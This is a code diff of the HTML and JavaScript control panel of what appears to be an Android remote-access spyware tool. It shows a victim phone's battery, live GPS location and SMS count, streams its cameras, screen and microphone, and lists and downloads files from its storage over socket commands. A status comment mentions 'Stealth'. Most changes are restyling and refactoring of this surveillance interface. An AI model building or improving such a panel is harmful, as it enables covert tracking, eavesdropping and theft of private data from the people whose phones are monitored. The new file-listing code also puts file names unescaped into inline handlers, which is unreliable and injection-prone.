@@ -11,9 +11,9 @@
             --sidebar-bg: #2c3e50; --teal: #1abc9c; --blue: #3498db; --red: #e74c3c;
             --win-bg: #ffffff; --win-hover: #e5f3ff; --win-border: #d9d9d9;
         }
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; height: 100vh; background: #f4f7f6; overflow: hidden; }
+        body { font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; height: 100vh; background: #f4f7f6; overflow: hidden; }
         
-        /* Sidebar Navigation */
+        /* Sidebar */
         .sidebar { width: 240px; background: var(--sidebar-bg); color: white; flex-shrink: 0; display: flex; flex-direction: column; }
         .sidebar-header { padding: 20px; background: #1a252f; font-weight: bold; font-size: 1.1rem; }
         .nav-item { padding: 12px 20px; display: flex; align-items: center; color: #bdc3c7; cursor: pointer; border-left: 4px solid transparent; }
@@ -23,7 +23,7 @@
         .main { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
         .content { flex: 1; padding: 20px; overflow-y: auto; }
 
-        /* Top Status Tiles */
+        /* Status Bar (Battery, GPS, Stealth) */
         .status-row { display: flex; gap: 15px; margin-bottom: 25px; }
         .tile { background: white; flex: 1; border-radius: 4px; display: flex; box-shadow: 0 1px 3px rgba(0,0,0,0.1); overflow: hidden; }
         .tile-icon { width: 60px; display: flex; align-items: center; justify-content: center; font-size: 1.8rem; color: #fff; }
@@ -32,37 +32,36 @@
         .tile-body span { font-size: 1rem; color: #333; }
 
         /* Windows Explorer Style */
-        .explorer-container { background: white; border: 1px solid var(--win-border); display: flex; flex-direction: column; height: 80%; border-radius: 4px; }
-        .explorer-toolbar { padding: 10px; background: #f5f5f5; border-bottom: 1px solid var(--win-border); display: flex; align-items: center; gap: 10px; }
+        .explorer-container { background: white; border: 1px solid var(--win-border); display: flex; flex-direction: column; height: 85%; border-radius: 4px; }
+        .explorer-toolbar { padding: 10px; background: #f5f5f5; border-bottom: 1px solid var(--win-border); display: flex; gap: 10px; }
         .address-bar { flex: 1; background: white; border: 1px solid #ccc; padding: 5px 10px; font-size: 0.9rem; display: flex; align-items: center; }
-        .explorer-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); gap: 10px; padding: 20px; overflow-y: auto; align-content: start; }
-        .file-item { text-align: center; padding: 10px; cursor: pointer; border-radius: 3px; border: 1px solid transparent; transition: 0.1s; }
+        .explorer-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); gap: 10px; padding: 20px; overflow-y: auto; }
+        .file-item { text-align: center; padding: 10px; cursor: pointer; border-radius: 3px; border: 1px solid transparent; }
         .file-item:hover { background: var(--win-hover); border: 1px solid #cce8ff; }
         .file-item i { font-size: 2.5rem; display: block; margin-bottom: 8px; }
-        .file-item span { font-size: 0.8rem; word-break: break-all; color: #333; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
         .icon-folder { color: #ffca28; }
         .icon-file { color: #78909c; }
 
-        /* 30 FPS Floating Video overlay */
+        /* Floating 30 FPS Live View Window */
         .video-overlay {
             display: none; position: fixed; bottom: 20px; right: 20px;
-            width: 400px; background: #000; border-radius: 8px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5); z-index: 9999; border: 1px solid #444;
+            width: 420px; background: #000; border-radius: 8px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.6); z-index: 9999; border: 1px solid #444;
         }
-        .video-header { padding: 10px; background: #222; color: #fff; display: flex; justify-content: space-between; border-radius: 8px 8px 0 0; font-size: 0.8rem; }
-        .video-body img { width: 100%; height: auto; display: block; }
-        .video-footer { padding: 10px; text-align: center; }
-        .btn-stop { background: var(--red); color: white; border: none; padding: 8px 20px; border-radius: 4px; cursor: pointer; }
+        .video-header { padding: 10px; background: #222; color: #fff; display: flex; justify-content: space-between; border-radius: 8px 8px 0 0; }
+        .video-body { background: #000; display: flex; justify-content: center; align-items: center; min-height: 250px; }
+        #stream-feed { max-width: 100%; max-height: 500px; display: block; }
+        .video-footer { padding: 12px; text-align: center; background: #222; border-radius: 0 0 8px 8px; }
 
-        /* Live Panel Controls */
-        .live-panel { background: white; padding: 30px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
-        .mode-selector { display: flex; justify-content: center; gap: 20px; margin-bottom: 20px; }
-        .mode-box { border: 1px solid #ddd; padding: 15px; width: 80px; text-align: center; border-radius: 4px; cursor: pointer; position: relative; }
+        /* Controls */
+        .live-panel { background: white; padding: 30px; border-radius: 4px; }
+        .mode-selector { display: flex; justify-content: center; gap: 20px; margin-bottom: 25px; }
+        .mode-box { border: 1px solid #ddd; padding: 15px; width: 80px; text-align: center; cursor: pointer; position: relative; border-radius: 4px; }
         .mode-box.selected { border-color: var(--blue); background: #ebf5fb; }
         .mode-box.selected .check { display: block; position: absolute; top: 2px; right: 2px; color: var(--blue); }
         .check { display: none; }
-        select, .btn-main { width: 280px; padding: 10px; margin: 10px auto; display: block; border-radius: 4px; border: 1px solid #ccc; }
-        .btn-main { background: var(--red); color: white; font-weight: bold; cursor: pointer; border: none; }
+        select, .btn-main { width: 280px; padding: 12px; margin: 10px auto; display: block; border-radius: 4px; border: 1px solid #ccc; font-weight: bold; }
+        .btn-main { background: var(--red); color: white; cursor: pointer; border: none; }
     </style>
 </head>
 <body>
@@ -77,13 +76,13 @@
     </div>
 
     <div class="main">
-        <div class="top-bar"><strong>Device: RMX2020</strong></div>
+        <div class="top-bar"><strong>Status: <span id="conn-status" style="color:var(--teal)">Connected</span> | Device: RMX2020</strong></div>
 
         <div class="content">
             <div class="status-row">
-                <div class="tile"><div class="tile-icon" style="background:#bdc3c7"><i class="fa fa-signal"></i></div><div class="tile-body"><label>Signal</label><span>Online</span></div></div>
+                <div class="tile"><div class="tile-icon" style="background:#bdc3c7"><i class="fa fa-signal"></i></div><div class="tile-body"><label>Network</label><span>Online</span></div></div>
                 <div class="tile"><div class="tile-icon" style="background:var(--red)"><i class="fa fa-battery-half"></i></div><div class="tile-body" style="background:var(--red); color:white"><label style="color:white">Battery</label><span id="batt">-- %</span></div></div>
-                <div class="tile" style="flex:2"><div class="tile-icon" style="background:var(--blue)"><i class="fa fa-map-marker-alt"></i></div><div class="tile-body" style="background:var(--blue); color:white"><label style="color:white">Live GPS</label><span id="gps">Waiting...</span></div></div>
+                <div class="tile" style="flex:2"><div class="tile-icon" style="background:var(--blue)"><i class="fa fa-map-marker-alt"></i></div><div class="tile-body" style="background:var(--blue); color:white"><label style="color:white">Location</label><span id="gps">Waiting for GPS...</span></div></div>
             </div>
 
             <div id="tab-dashboard">
@@ -91,9 +90,9 @@
                     <div style="background:var(--blue); padding:20px; color:white; border-radius:4px; position:relative;">
                         <i class="fa fa-envelope" style="font-size:3rem; opacity:0.2;"></i>
                         <div id="sms-count" style="font-size:2rem; position:absolute; right:20px; top:10px;">0</div>
-                        <div style="margin-top:20px; font-weight:bold;">SMS</div>
+                        <div style="margin-top:20px; font-weight:bold;">SMS DATA</div>
                     </div>
-                    </div>
+                </div>
             </div>
 
             <div id="tab-live" class="live-panel" style="display:none">
@@ -103,30 +102,28 @@
                     <div class="mode-box" onclick="setMode('screen', this)"><i class="fa fa-desktop" style="color:red"></i><div class="check"><i class="fa fa-check-circle"></i></div><div style="font-size:0.6rem">SCREEN</div></div>
                 </div>
                 <div id="video-ctrls">
-                    <select id="cam-id"><option value="0">Rear Camera</option><option value="1">Front Camera</option></select>
-                    <select id="aud-id"><option value="no">No Sound</option><option value="yes">Capture Audio</option></select>
+                    <select id="cam-id"><option value="0">Rear Camera (Default)</option><option value="1">Front Camera</option></select>
+                    <select id="aud-id"><option value="no">No Sound</option><option value="yes">With Audio</option></select>
                 </div>
-                <button class="btn-main" onclick="startLive()">START STREAM</button>
+                <button class="btn-main" id="start-btn" onclick="startLive()">START LIVE STREAM</button>
             </div>
 
             <div id="tab-explorer" style="display:none; height: 100%;">
                 <div class="explorer-container">
                     <div class="explorer-toolbar">
-                        <button onclick="sendCmd('get-files')"><i class="fa fa-sync"></i> Refresh</button>
-                        <div class="address-bar"><i class="fa fa-folder-open" style="color:#ffca28; margin-right:8px;"></i> <span id="current-path">/storage/emulated/0</span></div>
+                        <button onclick="sendCmd('get-files')"><i class="fa fa-sync"></i> Refresh Files</button>
+                        <div class="address-bar"><i class="fa fa-folder-open" style="color:#ffca28; margin-right:8px;"></i> <span id="path">/storage/emulated/0</span></div>
                     </div>
-                    <div class="explorer-grid" id="explorer-grid">
-                        <div style="color:#aaa; text-align:center; grid-column: 1/-1; padding:40px;">Click Refresh to load storage...</div>
-                    </div>
+                    <div class="explorer-grid" id="explorer-grid"></div>
                 </div>
             </div>
         </div>
     </div>
 
     <div id="video-overlay" class="video-overlay">
-        <div class="video-header"><span>LIVE STREAM</span><i class="fa fa-times" onclick="stopLive()" style="cursor:pointer"></i></div>
-        <div class="video-body"><img id="stream-feed" src=""></div>
-        <div class="video-footer"><button class="btn-stop" onclick="stopLive()">STOP STREAM</button></div>
+        <div class="video-header"><span id="stream-title">Live Camera</span><i class="fa fa-times" onclick="stopLive()" style="cursor:pointer"></i></div>
+        <div class="video-body"><img id="stream-feed" src="" alt="Stream Loading..."></div>
+        <div class="video-footer"><button style="background:var(--red); border:none; color:white; padding:8px 20px; border-radius:4px; cursor:pointer;" onclick="stopLive()">STOP STREAM</button></div>
     </div>
 
     <script>
@@ -143,12 +140,17 @@
             currentMode = m;
             document.querySelectorAll('.mode-box').forEach(b => b.classList.remove('selected'));
             el.classList.add('selected');
-            document.getElementById('video-ctrls').style.display = (m==='video'?'block':'none');
+            document.getElementById('video-ctrls').style.display = (m==='video' ? 'block' : 'none');
+            document.getElementById('stream-title').innerText = m.toUpperCase() + " STREAM";
         }
 
         function startLive() {
-            let cmd = `stream:${document.getElementById('cam-id').value}:${document.getElementById('aud-id').value==='yes'?'audio-video':'video'}`;
-            if(currentMode !== 'video') cmd = `stream:0:${currentMode}`;
+            let cmd = "";
+            if (currentMode === 'video') {
+                cmd = `stream:${document.getElementById('cam-id').value}:${document.getElementById('aud-id').value === 'yes' ? 'audio-video' : 'video'}`;
+            } else {
+                cmd = `stream:0:${currentMode}`;
+            }
             sendCmd(cmd);
             document.getElementById('video-overlay').style.display = 'block';
         }
@@ -156,34 +158,29 @@
         function stopLive() {
             sendCmd('stop-stream');
             document.getElementById('video-overlay').style.display = 'none';
+            document.getElementById('stream-feed').src = "";
         }
 
-        // SOCKET LISTENERS
-        socket.on('data-stream', (b) => { document.getElementById('stream-feed').src = "data:image/jpeg;base64," + b; });
+        // UPDATED: Screen/Video Frames
+        socket.on('data-stream', (base64) => {
+            document.getElementById('stream-feed').src = "data:image/jpeg;base64," + base64;
+        });
+
+        // Other Listeners
         socket.on('battery-update', (v) => { document.getElementById('batt').innerText = v + " %"; });
         socket.on('location-update', (d) => { document.getElementById('gps').innerText = d.lat + ", " + d.lng; });
         socket.on('sms-data', (d) => { document.getElementById('sms-count').innerText = JSON.parse(d).length; });
 
-        // WINDOWS EXPLORER LOGIC
+        // Explorer Logic
         socket.on('file-data', (data) => {
             const files = JSON.parse(data);
             const grid = document.getElementById('explorer-grid');
-            grid.innerHTML = '';
-            files.forEach(f => {
-                const item = document.createElement('div');
-                item.className = 'file-item';
-                const icon = f.d ? 'fa-folder icon-folder' : 'fa-file-alt icon-file';
-                item.innerHTML = `<i class="fa ${icon}"></i><span>${f.n}</span>`;
-                if(!f.d) item.onclick = () => sendCmd('download:' + f.n);
-                grid.appendChild(item);
-            });
-        });
-
-        socket.on('file-download-ready', (file) => {
-            const a = document.createElement('a');
-            a.href = "data:application/octet-stream;base64," + file.data;
-            a.download = file.name;
-            a.click();
+            grid.innerHTML = files.map(f => `
+                <div class="file-item" onclick="${f.d ? '' : `sendCmd('download:${f.n}')`}">
+                    <i class="fa ${f.d ? 'fa-folder icon-folder' : 'fa-file-alt icon-file'}"></i>
+                    <span>${f.n}</span>
+                </div>
+            `).join('');
         });
     </script>
 </body>
